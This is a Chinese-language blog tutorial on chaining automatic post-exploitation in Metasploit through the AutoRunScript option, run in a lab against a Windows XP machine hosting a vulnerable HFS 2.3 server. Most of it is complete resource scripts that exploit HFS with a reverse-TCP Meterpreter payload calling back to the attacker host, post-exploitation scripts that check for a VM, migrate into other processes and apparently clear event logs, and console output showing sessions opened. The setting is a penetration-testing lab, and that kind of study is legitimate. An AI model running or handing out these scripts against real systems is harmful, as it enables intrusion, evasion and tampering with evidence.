---
layout: post
category: binghe-code-hack
title: 在Metasploit中使用AutoRunScript
tagline: by 冰河
tag: [hack,binghe-code-hack]
excerpt: 在Metasploit中使用AutoRunScript
lock: need
---

# 在Metasploit中使用AutoRunScript

Metasploit提供了强大的AutoRunScript工具，可以通过收入show advanced查看AutoRunScript的选项。它可以实现自动化的后渗透测试，只需执行一次就可以获得对目标的控制权限。我们可以通过输入set AutoRunScript [script-name]来设置AutoRunScript的选项，也可以在资源脚本中直接设置，后者一次性自动完成全部渗透操作和后渗透操作。通过使用multi_script和multi_console_command模块，AutoRunScript还可以一次性运行多个后渗透脚本。下面我们来进行实战：

攻击机 kali 192.168.175.128

靶机 WinXP 192.168.175.130

注意：这里的示例中在靶机上部署了HFS 2.3，以攻击HFS2.3的漏洞为例实施的。有关如何部署HFS2.3服务，请参考《[Metasploit实战二之——对威胁建模(附加搭建CVE:2014-6287漏洞环境)](https://blog.csdn.net/l1028386804/article/details/86567192)》。

### 使用AutoRunScript选项中的multiscript模块

#### 创建自动化后渗透脚本multi_script

脚本内容如下：

```
run post/windows/gather/checkvm
run post/windows/manage/migrate
```

这里，我们将脚本multi_script保存到/root/my_scripts目录下。

这个脚本主要用于后渗透测试，实现了checkvm(检查目标系统是否运行在虚拟环境的模块)和migrate(将攻击载荷迁移到安全进程的模块)模块自动化的后渗透脚本。

#### 创建渗透脚本resource_complete

```
use exploit/windows/http/rejetto_hfs_exec
set payload windows/meterpreter/reverse_tcp
set RHOST 192.168.175.130
set RPORT 8080
set LHOST 192.168.175.128
set LPORT 2222
set AutoRunScript multi_console_command -rc /root/my_scripts/multi_script
exploit
```

这个脚本同样保存到/root/my_scripts目录下

这个脚本设置了对HFS文件服务器进行渗透所必需的所有参数，并实现了攻击的自动化，也可以是使用multi_console_command对AutoRunScript进行设置，将multi_console_command设定为-rc，可以执行对个后渗透脚本。

#### 运行渗透脚本resource_complete

```
msfconsole
msf5 > resource /root/my_scripts/resource_complete
[*] Processing /root/my_scripts/resource_complete for ERB directives.
resource (/root/my_scripts/resource_complete)> use exploit/windows/http/rejetto_hfs_exec
resource (/root/my_scripts/resource_complete)> set payload windows/meterpreter/reverse_tcp
payload => windows/meterpreter/reverse_tcp
resource (/root/my_scripts/resource_complete)> set RHOST 192.168.175.130
RHOST => 192.168.175.130
resource (/root/my_scripts/resource_complete)> set RPORT 8080
RPORT => 8080
resource (/root/my_scripts/resource_complete)> set LHOST 192.168.175.128
LHOST => 192.168.175.128
resource (/root/my_scripts/resource_complete)> set LPORT 2222
LPORT => 2222
resource (/root/my_scripts/resource_complete)> set AutoRunScript multi_console_command -rc /root/my_scripts/multi_script
AutoRunScript => multi_console_command -rc /root/my_scripts/multi_script
resource (/root/my_scripts/resource_complete)> exploit

[*] Started reverse TCP handler on 192.168.175.128:2222 
[*] Using URL: http://0.0.0.0:8080/E9UzLCydhDL
[*] Local IP: http://192.168.175.128:8080/E9UzLCydhDL
[*] Server started.
[*] Sending a malicious request to /
[*] Payload request received: /E9UzLCydhDL
[*] Sending stage (179779 bytes) to 192.168.175.130
[*] Meterpreter session 1 opened (192.168.175.128:2222 -> 192.168.175.130:1060) at 2019-01-26 10:16:09 +0800
[*] Session ID 1 (192.168.175.128:2222 -> 192.168.175.130:1060) processing AutoRunScript 'multi_console_command -rc /root/my_scripts/multi_script'
[*] Running Command List ...
[!] Tried to delete %TEMP%\xBDTumQie.vbs, unknown result
[*] Server stopped.

meterpreter >
[*] Checking if LIUYAZHUANG is a Virtual Machine .....
[+] This is a VMware Virtual Machine
[*] Running module against LIUYAZHUANG
[*] Current server process: qQbMLQjEENOQL.exe (1592)
[*] Spawning notepad.exe process to migrate to
[+] Migrating to 1380
[+] Successfully migrated to process 1380
```

我们看到，checkvm和migrate模块都已经成功执行，目标运行在VMWare上，控制程序也已经成功迁移到了1380进程上。

#### 使用AutoRunScript选项中的multiscript模块

可以使用multiscript模块创建一个后渗透脚本

#### 创建后渗透脚本multi_scr.rc

脚本内容如下:

```
checkvm
migrate -n explorer.exe
get_env
event_manager -i
```

这里，我们同样把这个脚本保存在/root/my_scripts目录下。

#### 创建渗透脚本resource_rc

具体内容如下：

```
use exploit/windows/http/rejetto_hfs_exec
set payload windows/meterpreter/reverse_tcp
set RHOST 192.168.175.130
set RPORT 8080
set LHOST 192.168.175.128
set LPORT 2222
set AutoRunScript multiscript -rc /root/my_script/multi_scr.rc
exploit
```

#### 运行渗透脚本

```
msf5 > resource /root/my_scripts/resource_rc
[*] Processing /root/my_scripts/resource_rc for ERB directives.
resource (/root/my_scripts/resource_rc)> use exploit/windows/http/rejetto_hfs_exec
resource (/root/my_scripts/resource_rc)> set payload windows/meterpreter/reverse_tcp
payload => windows/meterpreter/reverse_tcp
resource (/root/my_scripts/resource_rc)> set RHOST 192.168.175.130
RHOST => 192.168.175.130
resource (/root/my_scripts/resource_rc)> set RPORT 8080
RPORT => 8080
resource (/root/my_scripts/resource_rc)> set LHOST 192.168.175.128
LHOST => 192.168.175.128
resource (/root/my_scripts/resource_rc)> set LPORT 2222
LPORT => 2222
resource (/root/my_scripts/resource_rc)> set AutoRunScript multiscript -rc /root/my_script/multi_scr.rc
AutoRunScript => multiscript -rc /root/my_script/multi_scr.rc
resource (/root/my_scripts/resource_rc)> exploit

[*] Started reverse TCP handler on 192.168.175.128:2222 
[*] Using URL: http://0.0.0.0:8080/YfmEYmEV9x
[*] Local IP: http://192.168.175.128:8080/YfmEYmEV9x
[*] Server started.
[*] Sending a malicious request to /
[*] Payload request received: /YfmEYmEV9x
[*] Sending stage (179779 bytes) to 192.168.175.130
[*] Meterpreter session 1 opened (192.168.175.128:2222 -> 192.168.175.130:1065) at 2019-01-27 11:50:34 +0800
[*] Session ID 1 (192.168.175.128:2222 -> 192.168.175.130:1065) processing AutoRunScript 'multiscript -rc /root/my_script/multi_scr.rc'
[!] Tried to delete %TEMP%\bMXpbLteZtoos.vbs, unknown result
[*] Server stopped.

meterpreter > 
```

## 写在最后

> 如果你觉得冰河写的还不错，请微信搜索并关注「 **冰河技术** 」微信公众号，跟冰河学习高并发、分布式、微服务、大数据、互联网和云原生技术，「 **冰河技术** 」微信公众号更新了大量技术专题，每一篇技术文章干货满满！不少读者已经通过阅读「 **冰河技术** 」微信公众号文章，吊打面试官，成功跳槽到大厂；也有不少读者实现了技术上的飞跃，成为公司的技术骨干！如果你也想像他们一样提升自己的能力，实现技术能力的飞跃，进大厂，升职加薪，那就关注「 **冰河技术** 」微信公众号吧，每天更新超硬核技术干货，让你对如何提升技术能力不再迷茫！


![](https://img-blog.csdnimg.cn/20200906013715889.png)